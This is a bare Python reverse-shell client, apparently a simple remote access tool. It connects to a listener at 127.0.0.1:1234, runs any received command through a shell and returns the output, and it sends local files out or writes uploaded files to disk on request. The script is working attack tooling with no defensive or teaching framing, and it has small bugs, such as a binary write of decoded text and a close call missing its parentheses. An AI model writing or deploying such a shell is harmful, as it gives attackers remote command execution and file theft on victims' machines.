import socket 
import subprocess
cs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip='127.0.0.1'
port=1234
cs.connect((ip,port))
msg='First Connection'
cs.send(msg.encode())
msg=cs.recv(1024*10000).decode()
while msg!='quit':
    msg=list(msg.split(" "))
    if msg[0]=='download':
        filename=msg[1]
        f = open(filename,'rb')
        content=f.read()
        f.close()
        cs.send(content)
    elif msg[0]=='upload':
        filename=msg[1]
        filesize=int(msg[2])
        content=cs.recv(filesize).decode()
        f=open(filename,'wb')
        f.write(content)
        f.close()
    else:
        p=subprocess.Popen(
            msg,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        output,error=p.communicate()
        if (len(output)>0):
            msg=output.decode('utf-8', errors='ignore')
        else:
            msg=error.decode('utf-8', errors='ignore')
        cs.send(msg.encode())
        msg=cs.recv(5000).decode()
cs.close
